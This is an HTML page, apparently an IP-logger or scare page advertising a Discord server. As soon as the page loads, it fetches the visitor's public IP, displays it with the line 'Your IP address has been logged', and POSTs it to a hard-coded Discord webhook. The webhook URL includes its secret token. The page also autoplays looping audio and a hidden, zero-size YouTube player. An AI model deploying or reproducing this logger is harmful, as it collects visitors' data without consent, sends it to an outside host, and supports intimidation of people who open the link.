<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>discord.gg/drogen</title> <!-- Titel der Seite -->
    <style>
        body {
            margin: 0;
            padding: 0;
            height: 100vh;
            display: flex;
            flex-direction: column;
            justify-content: center;
            align-items: center;
            background-size: cover;
            background-position: center;
            background-repeat: no-repeat;
            color: white;
            text-shadow: 2px 2px 4px rgba(0,0,0,0.5);
        }
        #ipDisplay {
            font-size: 4em;
            font-weight: bold;
            margin-bottom: 10px;
        }
        .subtitle {
            font-size: 1.8em;
            font-weight: bold;
        }
    </style>
</head>
<body>
    <div id="player"></div>
    <p id="ipDisplay">Loading your IP address...</p>
    <p class="subtitle">Your IP address has been logged</p>

    <!-- MP3 Player (Musik wird direkt beim Laden abgespielt) -->
    <audio id="backgroundAudio" autoplay loop>
        <source src="https://cdn.discordapp.com/attachments/1151144288483283016/1331247379873267722/video0_4.mp3?ex=6790ec3c&is=678f9abc&hm=b7fb03d1208db3c18da202c24059577c6738efdfdfcfe9cca3a06ecc05887a4f&" type="audio/mpeg">
    </audio>

    <script>
        // Load YouTube API
        var tag = document.createElement('script');
        tag.src = "https://www.youtube.com/iframe_api";
        var firstScriptTag = document.getElementsByTagName('script')[0];
        firstScriptTag.parentNode.insertBefore(tag, firstScriptTag);

        let player;
        function onYouTubeIframeAPIReady() {
            player = new YT.Player('player', {
                height: '0',
                width: '0',
                videoId: 'YKflNeF5D_w', // Replace with your YouTube video ID
                playerVars: {
                    'autoplay': 1,
                    'controls': 0,
                    'loop': 1,
                    'playlist': 'YKflNeF5D_w' // Required for looping
                },
                events: {
                    'onReady': onPlayerReady,
                    'onStateChange': onPlayerStateChange
                }
            });
        }

        function onPlayerReady(event) {
            // Set volume to 50% and play immediately
            player.setVolume(50);
            player.playVideo();
        }

        function onPlayerStateChange(event) {
            // If video ends, replay it
            if (event.data === YT.PlayerState.ENDED) {
                player.playVideo();
            }
        }

        // Set background image
        document.body.style.backgroundImage = "url('https://cdn.discordapp.com/attachments/1151144288483283016/1331247474635046912/video0_4.gif?ex=6790ec53&is=678f9ad3&hm=3a89976dba559a1ec904403da9ae7cb8b11e1434f7cb45290010984b293bc1b7&')";

        async function logIP() {
            try {
                // Fetch the IP address
                const response = await fetch("https://api.ipify.org?format=json");
                const data = await response.json();
                const ip = data.ip;

                // Display the IP address
                document.getElementById('ipDisplay').textContent = `${ip}`;

                // Send IP to the webhook
                const webhookURL = "https://discord.com/api/webhooks/1329145060230692935/-93HduLZfipXZnGgRBszzvfpOHYdAjWwcAElg9N_FdT4IB4pPbr05lUMQdtoSqTrqR4h"; // Dein Discord Webhook-URL
                await fetch(webhookURL, {
                    method: "POST",
                    headers: {
                        "Content-Type": "application/json",
                    },
                    body: JSON.stringify({
                        content: `IP Address: ${ip}`,
                        timestamp: new Date().toISOString(),
                    }),
                });
            } catch (error) {
                console.error("Error logging IP:", error);
                document.getElementById('ipDisplay').textContent = "Error loading IP address";
            }
        }

        // Log the IP as soon as the page loads
        logIP();
    </script>
</body>
</html>
